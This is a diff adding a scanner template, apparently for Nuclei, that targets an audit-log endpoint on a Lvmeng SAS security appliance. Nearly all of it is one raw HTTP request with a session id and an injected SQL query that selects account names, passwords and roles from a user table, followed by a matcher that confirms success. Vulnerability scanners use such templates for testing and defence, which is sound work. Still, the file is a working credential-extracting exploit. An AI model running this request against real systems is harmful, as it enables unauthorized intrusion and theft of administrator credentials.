@@ -1,0 +1,22 @@
+id: lvmeng-sas-auditItems-sql
+info:
+  name: lvmeng-sas-auditItems-sql
+  author: changge
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /webconf/log/auditItems?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=SELECT+account+as+user,+password+as+ip,+roles+as+msg,+name+as+time+FROM+usr_obj HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Cache-Control: max-age=0
+        Accept-Language: zh-CN
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_1,"audit user")
